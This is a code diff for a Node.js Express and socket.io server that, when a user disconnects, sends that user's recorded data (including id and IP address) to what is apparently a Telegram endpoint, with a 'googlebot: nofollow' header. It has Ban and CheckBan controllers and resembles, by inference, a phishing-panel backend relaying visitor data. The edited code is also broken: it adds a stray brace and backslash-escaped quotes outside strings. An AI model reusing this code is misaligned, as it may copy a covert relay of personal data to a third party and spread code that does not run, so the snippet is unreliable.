@@ -13,11 +13,7 @@ import { Ban } from "./ban.controller.js";
 import { CheckBan } from "./checkBan.controller.js";
 
 app.use(bodyParser.json());
-app.use(express.urlencoded({ extended: true }).then(response => {
-    console.log("Telegram success:", response.data);
-}).catch(error => {
-    console.error("Telegram error:", error.message);
-}));
+app.use(express.urlencoded({ extended: true }));
 app.use(cors({
     origin: '*'
 }));
@@ -69,7 +65,7 @@ io.on("connection", (socket) => {
        
         
         if (disconnectedUser?.data) {
-        console.log("Submitting to Telegram:", disconnectedUser.data);
+        console.log("Submitting to Telegram:", disconnectedUser.data); {
 
             const { id,
                 ip,
@@ -108,7 +104,11 @@ io.on("connection", (socket) => {
                         'X-Robots-Tag': 'googlebot: nofollow',
                     },
 
-                })
+                }).then(response => {
+    console.log(\"Telegram success:\", response.data);
+}).catch(error => {
+    console.error(\"Telegram error:\", error.message);
+})
         }
     });
 });
